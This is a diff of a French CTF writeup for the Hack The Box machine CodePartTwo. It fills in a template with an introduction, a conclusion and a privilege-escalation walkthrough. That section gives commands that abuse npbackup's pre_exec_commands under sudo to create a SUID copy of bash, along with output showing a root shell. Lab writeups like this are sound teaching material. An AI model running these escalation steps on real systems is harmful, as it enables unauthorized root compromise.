@@ -13,9 +13,9 @@ draft: true
 
 # --- PaperMod / navigation ---
 type: "writeups"
-summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
-description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
-tags: ["Easy"]
+summary: "CodePartTwo (HTB Easy) : sandbox JS, identifiants, accès SSH puis escalade via backup."
+description: "Writeup CodePartTwo (HTB Easy) : exploitation d’une sandbox JavaScript, récupération d’identifiants, accès SSH et escalade root via un outil de backup mal configuré."
+tags: ["Easy","web","sandbox","js2py","ssh","linux-privesc"]
 categories: ["Mes writeups"]
 
 # --- TOC & mise en page ---
@@ -26,7 +26,7 @@ TocOpen: true
 # --- Cover / images (Page Bundle) ---
 cover:
   image: "image.png"
-  alt: "Codeparttwo"
+  alt: "CodePartTwo HTB Easy : exploitation sandbox JavaScript, accès SSH et escalade de privilèges via npbackup"
   caption: ""
   relative: true
   hidden: false
@@ -37,7 +37,7 @@ cover:
 ctf:
   platform: "Hack The Box"
   machine: "Codeparttwo"
-  difficulty: "Easy | Medium | Hard"
+  difficulty: "Easy"
   target_ip: "10.129.x.x"
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "2h"
@@ -122,11 +122,7 @@ Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
 -->
 ## Introduction
 
-- Contexte (source, thème, objectif).
-- Hypothèses initiales (services attendus, techno probable).
-- Objectifs : obtenir `user.txt` puis `root.txt`.
-
----
+La machine **CodePartTwo** de Hack The Box (niveau Easy) propose un scénario complet mêlant **exécution de code via une sandbox JavaScript**, **récupération d’identifiants** et **accès SSH**. Tu y découvres comment exploiter une faiblesse côté application pour obtenir une première prise de pied, puis analyser un outil de sauvegarde mal configuré afin d’exécuter des commandes avec les privilèges root. Ce writeup détaille chaque étape, de l’énumération initiale jusqu’à l’escalade de privilèges, avec une approche claire et reproductible adaptée aux débutants en CTF.
 
 ## Énumération
 
@@ -1151,10 +1147,16 @@ Cela permet d’obtenir un binaire exécutable avec les privilèges root.
 
 On commence par modifier notre fichier de configuration `/var/tmp/root.conf` en ajoutant les commandes dans `pre_exec_commands` :
 
+```bash
+nano /var/tmp/root.conf
 ```
-pre_exec_commands:
-  - cp /bin/bash /var/tmp/rootbash
-  - chmod +s /var/tmp/rootbash
+
+et d'y ajouter les commandes
+
+```txt
+      pre_exec_commands:
+        - cp /bin/bash /var/tmp/rootbash
+        - chmod +s /var/tmp/rootbash
 ```
 
 > note : il faut indenter avec des espaces sinon le fichier ne sera pas valide
@@ -1165,6 +1167,11 @@ Une fois le fichier modifié, on vérifie qu’il est valide :
 sudo /usr/local/bin/npbackup-cli -c /var/tmp/root.conf --check-config-file
 ```
 
+```txt
+2026-03-18 16:30:49,302 :: INFO :: Config file seems valid
+2026-03-18 16:30:49,307 :: INFO :: ExecTime = 0:00:00.030375, finished, state is: success.
+```
+
 La sortie confirme que la configuration est correctement chargée.
 
 On peut alors lancer le backup :
@@ -1173,7 +1180,18 @@ On peut alors lancer le backup :
 sudo /usr/local/bin/npbackup-cli -c /var/tmp/root.conf --backup
 ```
 
-Les commandes définies dans `pre_exec_commands` sont exécutées avec les privilèges root, ce qui permet de créer le binaire SUID.
+La commande génère plusieurs erreurs liées à la configuration du backup, mais cela n’empêche pas l’exécution des commandes définies dans `pre_exec_commands`.
+
+On observe notamment :
+
+```txt
+Pre-execution of command cp /bin/bash /var/tmp/rootbash succeeded
+Pre-execution of command chmod +s /var/tmp/rootbash succeeded
+```
+
+Les commandes sont exécutées **avant** le processus de backup.
+
+Ainsi, même si le backup échoue ensuite, le binaire SUID est bien créé et exécutable avec les privilèges root.
 
 ------
 
@@ -1187,22 +1205,23 @@ Il ne reste plus qu’à exécuter le binaire :
 
 Puis vérifier les privilèges :
 
-```
-id
+```bash
+rootbash-5.0# id
+uid=1000(marco) gid=1000(marco) euid=0(root) egid=0(root) groups=0(root),1000(marco),1003(backups)
 ```
 
-On obtient alors un shell en tant que **root**, ce qui permet d’accéder au flag final :
+Tu obtiens ainsi un shell en tant que **root**, ce qui marque la fin de l’escalade de privilèges et du challenge.
 
 ```
 cat /root/root.txt
+3660xxxxxxxxxxxxxxxxxxxxxxxxda3b
 ```
 
 ## Conclusion
 
-- Récapitulatif de la chaîne d'attaque (du scan à root).
-- Vulnérabilités exploitées & combinaisons.
-- Conseils de mitigation et détection.
-- Points d'apprentissage personnels.
+Ce challenge **CodePartTwo** t’a permis de parcourir une chaîne d’exploitation complète, depuis l’exécution de code dans une sandbox JavaScript jusqu’à l’obtention d’un accès root. Tu as vu qu’une simple fonctionnalité applicative mal sécurisée peut conduire à une compromission totale, surtout lorsqu’elle est combinée à une mauvaise configuration côté système.
+
+Comme dans tout CTF Hack The Box, la progression repose sur une méthodologie simple et efficace : **énumération → exploitation → escalade de privilèges**. En identifiant les points d’entrée, en testant le comportement de l’application, puis en analysant les mécanismes exécutés avec des privilèges élevés, tu arrives progressivement à un contrôle complet de la machine.
 
 ---
 
